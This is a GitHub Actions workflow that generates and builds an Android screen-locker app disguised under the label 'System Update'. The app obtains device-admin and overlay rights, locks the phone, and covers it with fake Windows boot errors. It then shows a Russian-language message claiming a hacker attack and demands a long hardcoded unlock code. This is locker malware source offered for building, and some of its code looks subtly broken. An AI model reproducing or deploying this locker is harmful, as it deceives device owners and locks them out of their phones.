name: Build APK

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout code
        uses: actions/checkout@v4

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/clawd/locker
          mkdir -p app/src/main/res/xml

          cat << 'EOF' > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
              id 'org.jetbrains.kotlin.android' version '1.9.22' apply false
          }
          EOF

          cat << 'EOF' > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "Locker"
          include ':app'
          EOF

          cat << 'EOF' > app/build.gradle
          plugins {
              id 'com.android.application'
              id 'org.jetbrains.kotlin.android'
          }
          android {
              namespace 'com.clawd.locker'
              compileSdk 34
              defaultConfig {
                  applicationId "com.clawd.locker"
                  minSdk 26
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_17
                  targetCompatibility JavaVersion.VERSION_17
              }
              kotlinOptions { jvmTarget = '17' }
          }
          dependencies {
              implementation 'androidx.core:core-ktx:1.12.0'
              implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.9.22'
          }
          EOF

          cat << 'EOF' > app/src/main/AndroidManifest.xml
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
              <uses-permission android:name="android.permission.BIND_DEVICE_ADMIN" />
              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/ic_lock_lock"
                  android:label="System Update"
                  android:theme="@android:style/Theme.NoActionBar">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".LockOverlayService" android:exported="false" />
                  <receiver
                      android:name=".MyDeviceAdminReceiver"
                      android:permission="android.permission.BIND_DEVICE_ADMIN"
                      android:exported="true">
                      <meta-data
                          android:name="android.app.device_admin"
                          android:resource="@xml/device_admin" />
                      <intent-filter>
                          <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                      </intent-filter>
                  </receiver>
              </application>
          </manifest>
          EOF

          cat << 'EOF' > app/src/main/res/xml/device_admin.xml
          <device-admin xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-policies>
                  <force-lock />
              </uses-policies>
          </device-admin>
          EOF

          cat << 'EOF' > app/src/main/java/com/clawd/locker/MyDeviceAdminReceiver.kt
          package com.clawd.locker

          import android.app.admin.DeviceAdminReceiver

          class MyDeviceAdminReceiver : DeviceAdminReceiver()
          EOF

          cat << 'EOF' > app/src/main/java/com/clawd/locker/MainActivity.kt
          package com.clawd.locker

          import android.app.admin.DevicePolicyManager
          import android.content.ComponentName
          import android.content.Context
          import android.content.Intent
          import android.net.Uri
          import android.os.Build
          import android.os.Bundle
          import android.provider.Settings
          import android.widget.Button
          import android.widget.LinearLayout
          import android.widget.Toast
          import androidx.appcompat.app.AppCompatActivity

          class MainActivity : AppCompatActivity() {
              override fun onCreate(savedInstanceState: Bundle?) {
                  super.onCreate(savedInstanceState)
                  val layout = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setPadding(50, 50, 50, 50) }
                  val btnAdmin = Button(this).apply {
                      text = "1. Дать права Админа"
                      setOnClickListener {
                          val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                          intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, MyDeviceAdminReceiver::class.java))
                          startActivity(intent)
                      }
                  }
                  val btnOverlay = Button(this).apply {
                      text = "2. Разрешить поверх окон"
                      setOnClickListener {
                          if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                              if (!Settings.canDrawOverlays(this@MainActivity)) {
                                  startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:\$packageName")))
                              }
                          }
                      }
                  }
                  val btnLock = Button(this).apply {
                      text = "3. ЗАБЛОКИРОВАТЬ"
                      setOnClickListener {
                          val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
                          val admin = ComponentName(this@MainActivity, MyDeviceAdminReceiver::class.java)
                          if (dpm.isAdminActive(admin)) {
                              dpm.lockNow()
                              startService(Intent(this@MainActivity, LockOverlayService::class.java))
                          } else {
                              Toast.makeText(this@MainActivity, "Сначала дай права!", Toast.LENGTH_SHORT).show()
                          }
                      }
                  }
                  layout.addView(btnAdmin)
                  layout.addView(btnOverlay)
                  layout.addView(btnLock)
                  setContentView(layout)
              }
          }
          EOF

          cat << 'EOF' > app/src/main/java/com/clawd/locker/LockOverlayService.kt
          package com.clawd.locker

          import android.app.Service
          import android.content.Intent
          import android.graphics.Color
          import android.graphics.PixelFormat
          import android.graphics.Typeface
          import android.os.Build
          import android.os.Handler
          import android.os.IBinder
          import android.os.Looper
          import android.text.InputType
          import android.view.Gravity
          import android.view.View
          import android.view.WindowManager
          import android.widget.Button
          import android.widget.EditText
          import android.widget.LinearLayout
          import android.widget.TextView

          class LockOverlayService : Service() {
              private lateinit var windowManager: WindowManager
              private lateinit var overlayView: LinearLayout
              private lateinit var mainText: TextView
              private lateinit var inputLayout: LinearLayout
              
              private val PASSWORD = "12223914637140022111122333223617182918736527"

              override fun onCreate() {
                  super.onCreate()
                  windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
                  
                  val params = WindowManager.LayoutParams(
                      WindowManager.LayoutParams.MATCH_PARENT,
                      WindowManager.LayoutParams.MATCH_PARENT,
                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY else WindowManager.LayoutParams.TYPE_PHONE,
                      WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                      PixelFormat.TRANSLUCENT
                  )
                  
                  overlayView = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      gravity = Gravity.CENTER
                      setBackgroundColor(Color.RED)
                  }
                  
                  mainText = TextView(this).apply {
                      setTextColor(Color.WHITE)
                      textSize = 12f
                      typeface = Typeface.MONOSPACE
                      gravity = Gravity.CENTER
                      text = "Booting Windows...\nBoot error: 0x03527737\nBoot error: 0x0266712\nBoot error: 0x02897593\nBoot error: 0x01447812\nBoot error: 0x0150974\nBoot error: 0x03873700\nBoot error: 0x0700882\nBoot error: 0x03803618\nMemory section at address 0x0424* is locked!\nService UXCryptor started.\n\n* Windows blocked!"
                  }
                  overlayView.addView(mainText)
                  
                  inputLayout = LinearLayout(this).apply {
                      orientation = LinearLayout.VERTICAL
                      gravity = Gravity.CENTER
                      visibility = View.GONE
                      setPadding(20, 20, 20, 20)
                      setBackgroundColor(Color.parseColor("#0000AA"))
                  }
                  
                  val hintText = TextView(this).apply {
                      text = "УВЫ! Вы подверглись масштабной хакерской атаке.\nВведите код разблокировки:"
                      setTextColor(Color.WHITE)
                      textSize = 16f
                      gravity = Gravity.CENTER
                  }
                  
                  val input = EditText(this).apply {
                      hint = "Введите код"
                      inputType = InputType.TYPE_CLASS_NUMBER
                  }
                  
                  val btnUnlock = Button(this).apply {
                      text = "РАЗБЛОКИРОВАТЬ"
                      setOnClickListener {
                          if (input.text.toString() == PASSWORD) {
                              stopSelf()
                          } else {
                              input.error = "Неверный код!"
                          }
                      }
                  }
                  
                  inputLayout.addView(hintText)
                  inputLayout.addView(input)
                  inputLayout.addView(btnUnlock)

                  windowManager.addView(overlayView, params)
                  windowManager.addView(inputLayout, params)

                  startAnimation()
              }

              private fun startAnimation() {
                  val handler = Handler(Looper.getMainLooper())
                  
                  handler.postDelayed({
                      mainText.text = "MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMM              MMMMMMMM\nMMMMMM    MMMMMMMM    MMMMMMMM\nMMMMM   MMMMMMMMMMMM   MMMMMMM\nMMMM   MMMMMMMMMMMMMM   MMMMMM\nMMM    MMMMMMMMMMMMMM    MMMM\nMMM    MMMMMMMMMMMMMM    MMMM\nMMMM   MMMMMMMMMMMMMM   MMMMMM\nMMMMM   MMMMMMMMMMMM   MMMMMMM\nMMMMMM    MMMMMMMM    MMMMMMMM\nMMMMMMMM              MMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"
                      mainText.textSize = 18f
                      
                      handler.postDelayed({
                          overlayView.visibility = View.GONE
                          inputLayout.visibility = View.VISIBLE
                      }, 5000)
                      
                  }, 5000)
              }

              override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_SERVICE
              override fun onBind(intent: Intent?): IBinder? = null
              
              override fun onDestroy() {
                  super.onDestroy()
                  if (::overlayView.isInitialized) windowManager.removeView(overlayView)
                  if (::inputLayout.isInitialized) windowManager.removeView(inputLayout)
              }
          }
          EOF

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Download Android SDK
        run: |
          wget -q https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
          mkdir -p $ANDROID_HOME/cmdline-tools
          unzip -q commandlinetools-linux-11076708_latest.zip -d $ANDROID_HOME/cmdline-tools
          mv $ANDROID_HOME/cmdline-tools/cmdline-tools $ANDROID_HOME/cmdline-tools/latest
          yes | $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager --licenses
          $ANDROID_HOME/cmdline-tools/latest/bin/sdkmanager "platform-tools" "platforms;android-34" "build-tools;34.0.0"

      - name: Generate Gradle Wrapper
        run: gradle wrapper --gradle-version 8.7

      - name: Build with Gradle
        run: |
          chmod +x gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Locker-APK
          path: app/build/outputs/apk/debug/app-debug.apk 
